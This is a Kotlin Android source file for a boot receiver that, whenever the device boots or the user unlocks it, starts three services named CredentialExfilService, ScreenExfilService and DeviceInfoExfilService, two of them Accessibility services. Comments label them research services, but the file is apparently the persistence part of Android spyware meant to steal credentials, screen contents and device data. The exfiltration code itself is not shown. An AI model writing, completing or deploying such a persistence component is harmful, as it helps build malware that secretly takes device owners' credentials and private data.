package com.yourpackage.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.yourpackage.services.CredentialExfilService
import com.yourpackage.services.DeviceInfoExfilService
import com.yourpackage.services.ScreenExfilService

/**
 * BroadcastReceiver that starts all services when the device boots up.
 * Also handles USER_PRESENT (when the user unlocks the device) as a fallback.
 */
class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "BootReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return

        Log.d(TAG, "📡 Received broadcast: $action")

        when (action) {
            Intent.ACTION_BOOT_COMPLETED,
            Intent.ACTION_QUICKBOOT_POWERON,
            Intent.ACTION_USER_PRESENT -> {
                startServices(context)
            }
            else -> {
                Log.d(TAG, "Ignoring action: $action")
            }
        }
    }

    /**
     * Start all the research services.
     */
    private fun startServices(context: Context) {
        try {
            Log.d(TAG, "🚀 Starting research services on boot...")

            // Start CredentialExfilService (Accessibility)
            val credentialIntent = Intent(context, CredentialExfilService::class.java)
            context.startService(credentialIntent)

            // Start ScreenExfilService (Accessibility)
            val screenIntent = Intent(context, ScreenExfilService::class.java)
            context.startService(screenIntent)

            // Start DeviceInfoExfilService (Regular service)
            val deviceIntent = Intent(context, DeviceInfoExfilService::class.java)
            context.startService(deviceIntent)

            Log.d(TAG, "✅ All services started successfully on boot")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start services on boot: ${e.message}")
        }
    }
}